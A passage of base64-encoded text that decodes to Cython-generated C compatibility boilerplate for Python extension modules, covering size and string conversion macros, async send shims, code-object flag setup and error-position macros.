ShvKQogICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfR0VUX1NJWkUobykgUHlCeXRlQXJyYXlfR0VUX1NJWkUobykKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKG8pIFB5VW5pY29kZV9HRVRfTEVOR1RIKG8pCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKG8pIFB5VHVwbGVfU2l6ZShvKQogICNkZWZpbmUgX19QeXhfUHlMaXN0X0dFVF9TSVpFKG8pIFB5TGlzdF9TaXplKG8pCiAgI2RlZmluZSBfX1B5eF9QeVNldF9HRVRfU0laRShvKSBQeVNldF9TaXplKG8pCiAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0dFVF9TSVpFKG8pIFB5Qnl0ZXNfU2l6ZShvKQogICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfR0VUX1NJWkUobykgUHlCeXRlQXJyYXlfU2l6ZShvKQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgobykgUHlVbmljb2RlX0dldExlbmd0aChvKQojZW5kaWYKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICNkZWZpbmUgX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKG5hbWUpIFB5SW1wb3J0X0FkZE1vZHVsZVJlZihuYW1lKQojZWxzZQogIHN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoY29uc3QgY2hhciAqbmFtZSkgewogICAgICBQeU9iamVjdCAqbW9kdWxlID0gUHlJbXBvcnRfQWRkTW9kdWxlKG5hbWUpOwogICAgICBQeV9YSU5DUkVGKG1vZHVsZSk7CiAgICAgIHJldHVybiBtb2R1bGU7CiAgfQojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiAhZGVmaW5lZChQeVVuaWNvZGVfSW50ZXJuRnJvbVN0cmluZykKICAjZGVmaW5lIFB5VW5pY29kZV9JbnRlcm5Gcm9tU3RyaW5nKHMpIFB5VW5pY29kZV9Gcm9tU3RyaW5nKHMpCiNlbmRpZgojZGVmaW5lIF9fUHl4X1B5TG9uZ19Gcm9tSGFzaF90IFB5TG9uZ19Gcm9tU3NpemVfdAojZGVmaW5lIF9fUHl4X1B5TG9uZ19Bc0hhc2hfdCAgIF9fUHl4X1B5SW5kZXhfQXNTc2l6ZV90CiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDAKICAgICNkZWZpbmUgX19QeXhfUHlTZW5kUmVzdWx0IFB5U2VuZFJlc3VsdAojZWxzZQogICAgdHlwZWRlZiBlbnVtIHsKICAgICAgICBQWUdFTl9SRVRVUk4gPSAwLAogICAgICAgIFBZR0VOX0VSUk9SID0gLTEsCiAgICAgICAgUFlHRU5fTkVYVCA9IDEsCiAgICB9IF9fUHl4X1B5U2VuZFJlc3VsdDsKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDBBMwogIHR5cGVkZWYgX19QeXhfUHlTZW5kUmVzdWx0ICgqX19QeXhfcHlpdGVyX3NlbmRmdW5jKShQeU9iamVjdCAqaXRlciwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJlc3VsdCk7CiNlbHNlCiAgI2RlZmluZSBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgc2VuZGZ1bmMKI2VuZGlmCiNpZiAhQ1lUSE9OX1VTRV9BTV9TRU5ECiNkZWZpbmUgX19QWVhfSEFTX1BZX0FNX1NFTkQgMAojZWxpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDAKI2RlZmluZSBfX1BZWF9IQVNfUFlfQU1fU0VORCAxCiNlbHNlCiNkZWZpbmUgX19QWVhfSEFTX1BZX0FNX1NFTkQgMiAgLy8gb3VyIG93biBiYWNrcG9ydGVkIGltcGxlbWVudGF0aW9uCiNlbmRpZgojaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPCAyCiAgICAjZGVmaW5lIF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0IFB5QXN5bmNNZXRob2RzCiNlbHNlCiAgICB0eXBlZGVmIHN0cnVjdCB7CiAgICAgICAgdW5hcnlmdW5jIGFtX2F3YWl0OwogICAgICAgIHVuYXJ5ZnVuYyBhbV9haXRlcjsKICAgICAgICB1bmFyeWZ1bmMgYW1fYW5leHQ7CiAgICAgICAgX19QeXhfcHlpdGVyX3NlbmRmdW5jIGFtX3NlbmQ7CiAgICB9IF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0OwogICAgI2RlZmluZSBfX1B5eF9TbG90VHBBc0FzeW5jKHMpICgoUHlBc3luY01ldGhvZHMqKShzKSkKI2VuZGlmCiNpZiBDWVRIT05fVVNFX0FNX1NFTkQgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMEYwCiAgICAjZGVmaW5lIF9fUHl4X1RQRkxBR1NfSEFWRV9BTV9TRU5EICgxVUwgPDwgMjEpCiNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1RQRkxBR1NfSEFWRV9BTV9TRU5EICgwKQojZW5kaWYKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAKI2RlZmluZSBfX1B5eF9QeUludGVycHJldGVyU3RhdGVfR2V0KCkgUHlJbnRlcnByZXRlclN0YXRlX0dldCgpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpIFB5VGhyZWFkU3RhdGVfR2V0KCktPmludGVycAojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwCiNpZmRlZiBfX2NwbHVzcGx1cwpleHRlcm4gIkMiCiNlbmRpZgpQeUFQSV9GVU5DKHZvaWQgKikgUHlNZW1fQ2FsbG9jKHNpemVfdCBuZWxlbSwgc2l6ZV90IGVsc2l6ZSk7CiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgaW50IF9fUHl4X2luaXRfY29fdmFyaWFibGUoUHlPYmplY3QgKmluc3BlY3QsIGNvbnN0IGNoYXIqIG5hbWUsIGludCAqd3JpdGVfdG8pIHsKICAgIGludCB2YWx1ZTsKICAgIFB5T2JqZWN0ICpweV92YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoaW5zcGVjdCwgbmFtZSk7CiAgICBpZiAoIXB5X3ZhbHVlKSByZXR1cm4gMDsKICAgIHZhbHVlID0gKGludCkgUHlMb25nX0FzTG9uZyhweV92YWx1ZSk7CiAgICBQeV9ERUNSRUYocHlfdmFsdWUpOwogICAgKndyaXRlX3RvID0gdmFsdWU7CiAgICByZXR1cm4gdmFsdWUgIT0gLTEgfHwgIVB5RXJyX09jY3VycmVkKCk7Cn0Kc3RhdGljIGludCBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlcyh2b2lkKSB7CiAgICBQeU9iamVjdCAqaW5zcGVjdDsKICAgIGludCByZXN1bHQ7CiAgICBpbnNwZWN0ID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlKCJpbnNwZWN0Iik7CiAgICByZXN1bHQgPQojaWYgIWRlZmluZWQoQ09fT1BUSU1JWkVEKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX09QVElNSVpFRCIsICZDT19PUFRJTUlaRUQpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fTkVXTE9DQUxTKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX05FV0xPQ0FMUyIsICZDT19ORVdMT0NBTFMpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fVkFSQVJHUykKICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19WQVJBUkdTIiwgJkNPX1ZBUkFSR1MpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fVkFSS0VZV09SRFMpCiAgICAgICAgX19QeXhfaW5pdF9jb192YXJpYWJsZShpbnNwZWN0LCAiQ09fVkFSS0VZV09SRFMiLCAmQ09fVkFSS0VZV09SRFMpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fQVNZTkNfR0VORVJBVE9SKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX0FTWU5DX0dFTkVSQVRPUiIsICZDT19BU1lOQ19HRU5FUkFUT1IpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fR0VORVJBVE9SKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX0dFTkVSQVRPUiIsICZDT19HRU5FUkFUT1IpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fQ09ST1VUSU5FKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX0NPUk9VVElORSIsICZDT19DT1JPVVRJTkUpICYmCiNlbmRpZgogICAgICAgIDE7CiAgICBQeV9ERUNSRUYoaW5zcGVjdCk7CiAgICByZXR1cm4gcmVzdWx0ID8gMCA6IC0xOwp9CiNlbHNlCnN0YXRpYyBpbnQgX19QeXhfaW5pdF9jb192YXJpYWJsZXModm9pZCkgewogICAgcmV0dXJuIDA7ICAvLyBJdCdzIGEgbGltaXRlZCBBUEktb25seSBmZWF0dXJlCn0KI2VuZGlmCgoKI2lmIGRlZmluZWQoX1dJTjMyKSB8fCBkZWZpbmVkKFdJTjMyKSB8fCBkZWZpbmVkKE1TX1dJTkRPV1MpCiAgI2lmbmRlZiBfVVNFX01BVEhfREVGSU5FUwogICAgI2RlZmluZSBfVVNFX01BVEhfREVGSU5FUwogICNlbmRpZgojZW5kaWYKI2luY2x1ZGUgPG1hdGguaD4KI2lmZGVmIE5BTgojZGVmaW5lIF9fUFlYX05BTigpICgoZmxvYXQpIE5BTikKI2Vsc2UKc3RhdGljIENZVEhPTl9JTkxJTkUgZmxvYXQgX19QWVhfTkFOKCkgewogIGZsb2F0IHZhbHVlOwogIG1lbXNldCgmdmFsdWUsIDB4RkYsIHNpemVvZih2YWx1ZSkpOwogIHJldHVybiB2YWx1ZTsKfQojZW5kaWYKI2lmIGRlZmluZWQoX19DWUdXSU5fXykgJiYgZGVmaW5lZChfTERCTF9FUV9EQkwpCiNkZWZpbmUgX19QeXhfdHJ1bmNsIHRydW5jCiNlbHNlCiNkZWZpbmUgX19QeXhfdHJ1bmNsIHRydW5jbAojZW5kaWYKCiNpZm5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FCiNkZWZpbmUgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FIDAKI2VuZGlmCiNpZm5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSwojZGVmaW5lIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0sgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FCiNlbmRpZgojaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSwojZGVmaW5lIF9fUFlYX01BUktfRVJSX1BPUyhmX2luZGV4LCBsaW5lbm8pICB7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfZltmX2luZGV4XTsgKHZvaWQpIF9fcHl4X2ZpbGVuYW1lOyBfX3B5eF9saW5lbm8gPSBsaW5lbm87ICh2b2lkKSBfX3B5eF9saW5lbm87IF9fcHl4X2NsaW5lbm8gPSBfX0xJTkVfXzsgKHZvaWQpIF9fcHl4X2NsaW5lbm87IH0KI2Vsc2UKI2RlZmluZSBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSAgeyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X2ZbZl9pbmRleF07ICh2b2lkKSBfX3B5eF9maWxlbmFtZTsgX19weXhfbGluZW5vID0gbGluZW5vOyAodm9pZCkgX19weXhfbGluZW5vOyAodm9pZCkgX19weXhfY2xpbmVubzsgfQojZW5kaWYKI2RlZmluZSBfX1BZWF9FUlIoZl9pbmRleCwgbGluZW5vLCBMbl9lcnJvcikgXAogICAgeyBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSBnb3RvIExuX2Vycm9yOyB9CgojaWZkZWYgQ1lUSE9OX0VYVEVSTl9DCiAgICAjdW5kZWYgX19QWVhfRVhURVJOX0MKICAgICNkZWZpbmUgX19QWVhfRVhURVJOX0MgQ1lUSE9OX0VYVEVSTl9DCiNlbGlmIGRlZmluZWQoX19QWVhfRVhURVJOX0MpCiAgICAjaWZkZWYgX01TQ19WRVIKICAgICNwcmFnbWEgbWVzc2FnZSAoIlBsZWFzZSBkbyBub3QgZGVmaW5lIHRoZSAnX19QWVhfRVhURVJOX0MnIG1hY3JvIGV4dGVybmFsbHkuIFVzZSAnQ1lUSE9OX0VYVEVSTl9DJyBpbnN0ZWFkLiIpCiAgICAjZWxzZQogICAgI3dhcm5pbmcgUGxlYXNlIGRvIG5vdCBkZWZpbmUgdGhlICdfX1BZWF9FWFRFUk5fQycgbWFjcm8gZXh0ZXJuYWxseS4gVXNlICdDWVRIT05fRVhURVJOX0MnIGluc3RlYWQuCiAgICAjZW5kaWYKI2Vsc2UKICAjaWZkZWYgX19jcGx1c3BsdXMKICAgICNkZWZpbmUgX19QWVhfRVhURVJOX0MgZXh0ZXJuICJDIgogICNlbHNlCiAgICAjZGVmaW5lIF9fUFlYX0VYVEVSTl9DIGV4dGVybgogICNlbmRpZgojZW5kaWYKCiNkZWZpbmUgX19QWVhfSEFWRV9fYXcKI2RlZmluZSBfX1BZWF9IQVZFX0FQSV9fYXcKCiNpZmRlZiBfT1BFTk1QCiNpbmNsdWRlIDxvbXAuaD4KI2VuZGlmIAoKI2lmIGRlZmluZWQoUFlSRVhfV0lUSE9VVF9BU1NFUlRJT05TKSAmJiAhZGVmaW5lZChDWVRIT05fV0lUSE9VVF9BU1NFUlRJT05TKQojZGVmaW5lIENZVEhPTl9XSVRIT1VUX0FTU0VSVElPTlMKI2VuZGlmCgojZGVmaW5lIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJIDAKI2RlZmluZSBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19VVEY4IDAKI2RlZmluZSBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElORyAiIgojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmcgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRnJvbVN0cmluZ0FuZFNpemUgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZQojZGVmaW5lIF9fUHl4X3VjaGFyX2Nhc3QoYykgKCh1bnNpZ25lZCBjaGFyKWMpCiNkZWZpbmUgX19QeXhfbG9uZ19jYXN0KHgpICgobG9uZyl4KQojZGVmaW5lIF9fUHl4X2ZpdHNfUHlfc3NpemVfdCh2LCB0eXBlLCBpc19zaWduZWQpICAoXAogICAgKHNpemVvZih0eXBlKSA8IHNpemVvZihQeV9zc2l6ZV90KSkgIHx8XAogICAgKHNpemVvZih0eXBlKSA+IHNpemVvZihQeV9zc2l6ZV90KSAmJlwKICAgICAgICAgIGxpa2VseSh2IDwgKHR5cGUpUFlfU1NJWkVfVF9NQVggfHxcCiAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01BWCkgICYmXAogICAgICAgICAgKCFpc19zaWduZWQgfHwgbGlrZWx5KHYgPiAodHlwZSlQWV9TU0laRV9UX01JTiB8fFwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2ID09ICh0eXBlKVBZX1NTSVpFX1RfTUlOKSkpICB8fFwKICAgIChzaXplb2YodHlwZSkgPT0gc2l6ZW9mKFB5X3NzaXplX3QpICYmXAogICAgICAgICAgKGlzX3NpZ25lZCB8fCBsaWtlbHkodiA8ICh0eXBlKVBZX1NTSVpFX1RfTUFYIHx8XAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01BWCkpKSAgKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfaXNfdmFsaWRfaW5kZXgoUHlfc3NpemVfdCBpLCBQeV9zc2l6ZV90IGxpbWl0KSB7CiAgICByZXR1cm4gKHNpemVfdCkgaSA8IChzaXplX3QpIGxpbWl0Owp9CiNpZiBkZWZpbmVkIChfX2NwbHVzcGx1cykgJiYgX19jcGx1c3BsdXMgPj0gMjAxMTAzTAogICAgI2luY2x1ZGUgPGNzdGRsaWI+CiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIHN0ZDo6YWJzKHZhbHVlKQojZWxpZiBTSVpFT0ZfSU5UID49IFNJWkVPRl9TSVpFX1QKICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgYWJzKHZhbHVlKQojZWxpZiBTSVpFT0ZfTE9ORyA+PSBTSVpFT0ZfU0laRV9UCiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIGxhYnModmFsdWUpCiNlbGlmIGRlZmluZWQgKF9NU0NfVkVSKQogICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSAoKFB5X3NzaXplX3QpX2FiczY0KHZhbHVlKSkKI2VsaWYgZGVmaW5lZCAoX19TVERDX1ZFUlNJT05fXykgJiYgX19TVERDX1ZFUlNJT05fXyA+PSAxOTk5MDFMCiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIGxsYWJzKHZhbHVlKQojZWxpZiBkZWZpbmVkIChfX0dOVUNfXykKICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgX19idWlsdGluX2xsYWJzKHZhbHVlKQojZWxzZQogICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSAoKHZhbHVlPDApID8gLXZhbHVlIDogdmFsdWUpCiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeV9zc2l6ZV90IF9fUHl4X3NzaXplX3N0cmxlbihjb25zdCBjaGFyICpzKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlPYmplY3RfQXNTdHJpbmcoUHlPYmplY3QqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlPYmplY3RfQXNTdHJpbmdBbmRTaXplKFB5T2JqZWN0KiwgUHlfc3NpemVfdCogbGVuZ3RoKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoY29uc3QgY2hhciopOwojZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmdBbmRTaXplKHMsIGwpIFB5Qnl0ZUFycmF5X0Zyb21TdHJpbmdBbmRTaXplKChjb25zdCBjaGFyKilzLCBsKQojZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfRnJvbVN0cmluZyAgICAgICAgUHlCeXRlc19Gcm9tU3RyaW5nCiNkZWZpbmUgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZyhjb25zdCBjaGFyKik7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVN0cmluZyhzKSAgICAgKChjaGFyKikgUHlCeXRlc19BU19TVFJJTkcocykpCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVNTdHJpbmcocykgICAgKChzaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzV3JpdGFibGVVU3RyaW5nKHMpICAgICgodW5zaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU3RyaW5nKHMpICAgICAoKGNvbnN0IGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1NTdHJpbmcocykgICAgKChjb25zdCBzaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzVVN0cmluZyhzKSAgICAoKGNvbnN0IHVuc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfQXNTdHJpbmcocykgUHlCeXRlQXJyYXlfQVNfU1RSSU5HKHMpCiNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVN0cmluZyhzKSAgICAgKChjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlU1N0cmluZyhzKSAgICAoKHNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlVVN0cmluZyhzKSAgICAoKHVuc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FzU3RyaW5nKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU3RyaW5nKHMpICAgICAoKGNvbnN0IGNoYXIqKSBQeUJ5dGVzX0FzU3RyaW5nKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU1N0cmluZyhzKSAgICAoKGNvbnN0IHNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1VTdHJpbmcocykgICAgKChjb25zdCB1bnNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfQXNTdHJpbmcocykgUHlCeXRlQXJyYXlfQXNTdHJpbmcocykKI2VuZGlmCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNXcml0YWJsZVN0cmluZyhzKSAgICAoKGNoYXIqKShfX3B5eF91aW50cHRyX3QpIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKHMpKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzV3JpdGFibGVTU3RyaW5nKHMpICAgICgoc2lnbmVkIGNoYXIqKShfX3B5eF91aW50cHRyX3QpIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKHMpKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzV3JpdGFibGVVU3RyaW5nKHMpICAgICgodW5zaWduZWQgY2hhciopKF9fcHl4X3VpbnRwdHJfdCkgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNTU3RyaW5nKHMpICAgICgoY29uc3Qgc2lnbmVkIGNoYXIqKSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSkKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Bc1VTdHJpbmcocykgICAgKChjb25zdCB1bnNpZ25lZCBjaGFyKikgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRnJvbUNTdHJpbmcocykgIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmcoKGNvbnN0IGNoYXIqKXMpCiNkZWZpbmUgX19QeXhfUHlCeXRlc19Gcm9tQ1N0cmluZyhzKSAgIF9fUHl4X1B5Qnl0ZXNfRnJvbVN0cmluZygoY29uc3QgY2hhciopcykKI2RlZmluZSBfX1B5eF9QeUJ5dGVBcnJheV9Gcm9tQ1N0cmluZyhzKSAgIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoKGNvbnN0IGNoYXIqKXMpCiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zyb21DU3RyaW5nKHMpIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nKChjb25zdCBjaGFyKilzKQojZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tT3JkaW5hbChvKSAgICAgICBQeVVuaWNvZGVfRnJvbU9yZGluYWwoKGludClvKQojZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Bc1VuaWNvZGUgICAgICAgICAgICBQeVVuaWNvZGVfQXNVbmljb2RlCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9OZXdSZWYoUHlPYmplY3QgKm9iaikgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwYTAwMDAgfHwgZGVmaW5lZChQeV9OZXdSZWYpCiAgICByZXR1cm4gUHlfTmV3UmVmKG9iaik7CiNlbHNlCiAgICBQeV9JTkNSRUYob2JqKTsKICAgIHJldHVybiBvYmo7CiNlbmRpZgp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9YTmV3UmVmKFB5T2JqZWN0ICpvYmopIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGEwMDAwIHx8IGRlZmluZWQoUHlfWE5ld1JlZikKICAgIHJldHVybiBQeV9YTmV3UmVmKG9iaik7CiNlbHNlCiAgICBQeV9YSU5DUkVGKG9iaik7CiAgICByZXR1cm4gb2JqOwojZW5kaWYKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfT3duZWRfUHlfTm9uZShpbnQgYik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfUHlCb29sX0Zyb21Mb25nKGxvbmcgYik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWUoUHlPYmplY3QqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZUFuZERlY3JlZihQeU9iamVjdCopOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlOdW1iZXJfTG9uZyhQeU9iamVjdCogeCk7CiNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9UdXBsZShvYmopXAogICAgKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3Qob2JqKSkgPyBfX1B5eF9OZXdSZWYob2JqKSA6IFB5U2VxdWVuY2VfVHVwbGUob2JqKSkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfc3NpemVfdCBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChQeU9iamVjdCopOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5TG9uZ19Gcm9tU2l6ZV90KHNpemVfdCk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X2hhc2hfdCBfX1B5eF9QeUluZGV4X0FzSGFzaF90KFB5T2JqZWN0Kik7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiNkZWZpbmUgX19QeXhfUHlGbG9hdF9Bc0RvdWJsZSh4KSAoUHlGbG9hdF9DaGVja0V4YWN0KHgpID8gUHlGbG9hdF9BU19ET1VCTEUoeCkgOiBQeUZsb2F0X0FzRG91YmxlKHgpKQojZGVmaW5lIF9fUHl4X1B5RmxvYXRfQVNfRE9VQkxFKHgpIFB5RmxvYXRfQVNfRE9VQkxFKHgpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlGbG9hdF9Bc0RvdWJsZSh4KSBQeUZsb2F0X0FzRG91YmxlKHgpCiNkZWZpbmUgX19QeXhfUHlGbG9hdF9BU19ET1VCTEUoeCkgUHlGbG9hdF9Bc0RvdWJsZSh4KQojZW5kaWYKI2RlZmluZSBfX1B5eF9QeUZsb2F0X0FzRmxvYXQoeCkgKChmbG9hdCkgX19QeXhfUHlGbG9hdF9Bc0RvdWJsZSh4KSkKI2RlZmluZSBfX1B5eF9QeU51bWJlcl9JbnQoeCkgKFB5TG9uZ19DaGVja0V4YWN0KHgpID8gX19QeXhfTmV3UmVmKHgpIDogUHlOdW1iZXJfTG9uZyh4KSkKI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMEE3C